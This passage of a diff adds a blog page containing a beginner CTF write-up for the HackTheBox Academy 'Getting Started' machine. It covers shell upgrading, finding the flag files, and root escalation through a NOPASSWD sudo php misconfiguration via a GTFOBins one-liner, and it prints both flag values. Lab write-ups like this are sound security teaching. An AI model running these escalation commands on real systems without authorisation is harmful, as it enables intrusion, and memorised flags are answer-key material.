+<p>After this, to make our lives easier we can simply run a command to search for the user.txt file instead of having to look for it to manually by navigating through the system directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> find / <span class="nt">-iname</span> user.txt 2&gt;/dev/null
+/home/mrb3n/user.txt
+</code></pre></div></div>
+
+<p>Now we navigate to the given file by <code class="language-plaintext highlighter-rouge">cd /home/mrb3n</code> . Running <code class="language-plaintext highlighter-rouge">ls</code> confirms that our file is indeed in the direcotry , so we proceed by opening it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home/mrb3n                                                                                                                                        
+<span class="nb">ls                                                                                                                                                    
+</span>user.txt                                                                                                                                              
+<span class="nb">cat </span>user.txt                                                                                                                                          
+7002d65b149b0a4d19132a66feed21d8
+</code></pre></div></div>
+<p>And there is our first flag. ==7002d65b149b0a4d19132a66feed21d8== are the contents of the <strong>user.txt</strong> file.</p>
+
+<p>Now , let’s move on to to escalating privileges to the root user.## Escalating Privileges - Becoming the root User
+Now that we’ve got a foothold on the machine through a reverse shell, we are asked to escalate privleges to the root user and submit the flag of <strong>root.txt</strong>.</p>
+
+<p>Now would probably be a good time for us to upgrade our terminal to a nicer TTY terminal to get some of the good ol’ Linux functionality. We can do this by running the following command.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>Now, let’s run the following commands to check what <code class="language-plaintext highlighter-rouge">sudo</code> privileges we have.</p>
+
+<p>` &gt; sudo -l`</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries <span class="k">for </span>www-data on gettingstarted:                                                                                             
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin                                 
+                                                                                                                                                      
+User www-data may run the following commands on gettingstarted:                                                                                       
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/php
+</code></pre></div></div>
+<p>From the output, we are told that we can run all commands using the <code class="language-plaintext highlighter-rouge">php</code> binary as sudo without a password.</p>
+
+<p>When we have misconfigured sudo privileges within the user binaries, we can easily refer to <a href="https://gtfobins.github.io">GTFOBins</a> for the command needed to escalate to the root user. If we search “php” on GTFOBins and click on <code class="language-plaintext highlighter-rouge">SUDO</code>, the command given should look like this.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">CMD</span><span class="o">=</span><span class="s2">"/bin/sh"</span>
+<span class="nb">sudo </span>php <span class="nt">-r</span> <span class="s2">"system('</span><span class="nv">$CMD</span><span class="s2">');"</span>
+</code></pre></div></div>
+<p>To avoid any complications with declaring environmental variables, we’ll use the following command as a substitute.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; sudo php -r "system('/bin/sh');"</code></p>
+
+<p>So let’s test if we escalated privileges with a simple <code class="language-plaintext highlighter-rouge">whoami</code> query.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+<p>Voila! We are now <strong>root</strong>. Let’s run the <code class="language-plaintext highlighter-rouge">find</code> command we used earlier to find the contents of the <strong>root.txt</strong> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> find / <span class="nt">-iname</span> root.txt 2&gt;/dev/null
+/root/root.txt
+<span class="o">&gt;</span> <span class="nb">cd</span> /root
+<span class="o">&gt;</span> <span class="nb">ls
+</span>root.txt
+<span class="o">&gt;</span> <span class="nb">cat </span>root.txt
+f1fba6e9f71efb2630e6e34da6387842
+</code></pre></div></div>
+<p>Congratulations, the final flag is ==f1fba6e9f71efb2630e6e34da6387842==. You have officially completed the module!
+The machine from the Getting Started module in HackTheBox Academy is a great first CTF for any beginner. I would recommend some basic knowledge of linux and tool usage , but the module does a great job in going over some of the skills and then letting the user try to pwn the machine on their own. If you would like to try the module yourself, here is the <a href="https://academy.hackthebox.com/course/preview/getting-started">link</a>.</p>
+
+<p><strong>Have fun and happy hacking!</strong></p>
+
+  </div><a class="u-url" href="/CTF-Writeups-and-Blogs/cybersecurity/2022/06/10/GettingStarted.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/CTF-Writeups-and-Blogs/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/CTF-Writeups-and-Blogs/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/CTF-Writeups-and-Blogs/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p>Cybersecurity blog and CTF Write Ups.</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li><a rel="me" href="https://github.com/SlyDaw" target="_blank" title="SlyDaw"><svg class="svg-icon grey"><use xlink:href="/CTF-Writeups-and-Blogs/assets/minima-social-icons.svg#github"></use></svg></a></li><li><a rel="me" href="https://twitter.com/slydaw1" target="_blank" title="slydaw1"><svg class="svg-icon grey"><use xlink:href="/CTF-Writeups-and-Blogs/assets/minima-social-icons.svg#twitter"></use></svg></a></li></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
